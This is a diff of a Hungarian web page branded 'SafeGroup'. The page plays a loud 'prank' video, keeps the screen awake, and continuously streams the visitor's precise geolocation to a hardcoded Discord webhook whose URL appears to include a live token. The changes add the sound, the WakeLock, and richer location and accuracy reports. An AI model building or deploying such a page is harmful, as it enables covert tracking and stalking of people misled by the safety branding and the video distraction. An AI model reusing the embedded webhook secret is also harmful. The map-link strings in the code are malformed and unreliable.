@@ -10,52 +10,62 @@
         .container { background: #2c2f33; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; margin: 20px auto; }
         .btn { background: #57f287; border: none; padding: 20px 40px; color: black; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 18px; width: 100%; }
         #status { margin-top: 15px; font-size: 16px; color: #b9bbbe; }
-        video { border-radius: 15px; margin-top: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        #video-container { display: none; margin-top: 15px; }
+        video { border-radius: 15px; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
 
     <div class="container">
         <h1>🛡️ SafeGroup</h1>
-        <span id="display-name" style="color:#5865f2; font-weight:bold;">Azonosítás szükséges</span>
+        <span id="display-name" style="color:#5865f2; font-weight:bold; font-size: 20px;">Azonosítás...</span>
         
         <button id="mainBtn" class="btn" onclick="initTracking()">KÖVETÉS INDÍTÁSA</button>
         
-        <!-- VIDEÓ KONTÉNER -->
-        <div id="video-container" style="display:none;">
-            <video id="prankVideo" width="100%" loop muted playsinline>
+        <div id="video-container">
+            <!-- Itt NINCS 'muted', hogy legyen hangja -->
+            <video id="myVideo" loop playsinline>
                 <source src="gojovs sukuna.mp4" type="video/mp4">
             </video>
         </div>
 
-        <div id="status">Nyomj a gombra!</div>
+        <div id="status">Nyomj a gombra az induláshoz!</div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462078788853698712/9m8atZ32hIGG_KKFyKsr_7ZKslgPMtPDzLC5ZrZhuyj-Dybh3ZJb_-yi45Z9VebGrCDD";
         let currentUserName = "";
+        let wakeLock = null;
 
         async function initTracking() {
             while (!currentUserName || currentUserName.trim() === "") {
                 currentUserName = prompt("Add meg a neved:");
                 if (currentUserName === null) return;
             }
+            
             document.getElementById("display-name").textContent = currentUserName;
-            document.getElementById("mainBtn").style.display = "none"; // Gomb elrejtése
+            document.getElementById("mainBtn").style.display = "none";
+            
+            // Videó elindítása HANGGAL
+            const video = document.getElementById("myVideo");
+            document.getElementById("video-container").style.display = "block";
+            video.muted = false; // Feloldjuk a némítást
+            video.play();
+
             startTracking();
         }
 
         async function startTracking() {
-            // Videó indítása
-            const videoCont = document.getElementById("video-container");
-            const video = document.getElementById("prankVideo");
-            videoCont.style.display = "block";
-            video.play();
+            // WakeLock a képernyő ébrentartásához
+            if ('wakeLock' in navigator) {
+                try { wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
+            }
 
             if (navigator.geolocation) {
                 navigator.geolocation.watchPosition(sendLocation, (err) => console.log(err), {
                     enableHighAccuracy: true,
-                    maximumAge: 0
+                    maximumAge: 0,
+                    timeout: 20000
                 });
             }
         }
@@ -63,20 +73,30 @@
         function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const acc = Math.round(position.coords.accuracy);
+            const googleLink = `https://www.google.com{lat},${lon}`;
+
+            // A SZÉP KÁRTYÁS FORMÁTUM VISSZAÁLLÍTÁSA
             const payload = {
                 embeds: [{
                     title: `🚀 ${currentUserName} mozgásban van`,
-                    description: `📍 [Térkép](https://www.google.com{lat},${lon})`,
                     color: 5814783,
+                    description: `📍 [Kattints ide a térkép megnyitásához](${googleLink})`,
+                    fields: [
+                        { name: "Pozíció", value: `\`${lat.toFixed(6)}, ${lon.toFixed(6)}\``, inline: true },
+                        { name: "Pontosság", value: `\`${acc} méter\``, inline: true }
+                    ],
+                    footer: { text: "SafeGroup v2026 • Frissítve: " + new Date().toLocaleTimeString() },
                     timestamp: new Date().toISOString()
                 }]
             };
+
             fetch(DISCORD_WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             }).then(() => {
-                document.getElementById("status").innerHTML = "✅ Frissítve: " + new Date().toLocaleTimeString();
+                document.getElementById("status").innerHTML = "✅ Pozíció elküldve: " + new Date().toLocaleTimeString();
             });
         }
     </script>
